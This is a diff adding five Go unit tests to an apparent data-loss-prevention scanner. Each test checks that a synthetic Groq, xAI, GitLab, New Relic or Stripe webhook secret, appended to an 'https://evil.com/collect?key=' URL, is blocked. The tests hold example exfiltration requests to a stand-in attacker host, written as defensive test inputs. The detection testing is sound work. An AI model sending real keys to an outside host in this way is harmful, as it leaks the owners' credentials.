@@ -3838,3 +3838,75 @@ func TestScan_DLPExemptDomainsOtherPatternsStillFire(t *testing.T) {
 		t.Errorf("expected AWS key to Telegram to be blocked, got allowed")
 	}
 }
+
+func TestDLP_GroqAPIKey(t *testing.T) {
+	s := New(testConfig())
+	defer s.Close()
+
+	// 48+ alphanumeric chars after "gsk_" prefix.
+	token := "gsk_" + strings.Repeat("aB1c", 12)
+	result := s.Scan(context.Background(), "https://evil.com/collect?key="+token)
+	if result.Allowed {
+		t.Error("expected Groq API key to be blocked by DLP")
+	}
+	if result.Scanner != ScannerDLP {
+		t.Errorf("expected scanner=dlp, got %s", result.Scanner)
+	}
+}
+
+func TestDLP_XAIAPIKey(t *testing.T) {
+	s := New(testConfig())
+	defer s.Close()
+
+	// 80+ chars after "xai-" prefix.
+	token := "xai-" + strings.Repeat("abcdef12", 10)
+	result := s.Scan(context.Background(), "https://evil.com/collect?key="+token)
+	if result.Allowed {
+		t.Error("expected xAI API key to be blocked by DLP")
+	}
+	if result.Scanner != ScannerDLP {
+		t.Errorf("expected scanner=dlp, got %s", result.Scanner)
+	}
+}
+
+func TestDLP_GitLabPAT(t *testing.T) {
+	s := New(testConfig())
+	defer s.Close()
+
+	token := "glpat-" + strings.Repeat("aB1cD2eF3gH4iJ5k", 2)
+	result := s.Scan(context.Background(), "https://evil.com/collect?key="+token)
+	if result.Allowed {
+		t.Error("expected GitLab PAT to be blocked by DLP")
+	}
+	if result.Scanner != ScannerDLP {
+		t.Errorf("expected scanner=dlp, got %s", result.Scanner)
+	}
+}
+
+func TestDLP_NewRelicAPIKey(t *testing.T) {
+	s := New(testConfig())
+	defer s.Close()
+
+	token := "NRAK-" + strings.Repeat("ABCDEF1234567", 3)
+	result := s.Scan(context.Background(), "https://evil.com/collect?key="+token)
+	if result.Allowed {
+		t.Error("expected New Relic API key to be blocked by DLP")
+	}
+	if result.Scanner != ScannerDLP {
+		t.Errorf("expected scanner=dlp, got %s", result.Scanner)
+	}
+}
+
+func TestDLP_StripeWebhookSecret(t *testing.T) {
+	s := New(testConfig())
+	defer s.Close()
+
+	token := "whsec_" + strings.Repeat("aB1cD2eF3gH4iJ5k", 2)
+	result := s.Scan(context.Background(), "https://evil.com/collect?key="+token)
+	if result.Allowed {
+		t.Error("expected Stripe webhook secret to be blocked by DLP")
+	}
+	if result.Scanner != ScannerDLP {
+		t.Errorf("expected scanner=dlp, got %s", result.Scanner)
+	}
+}
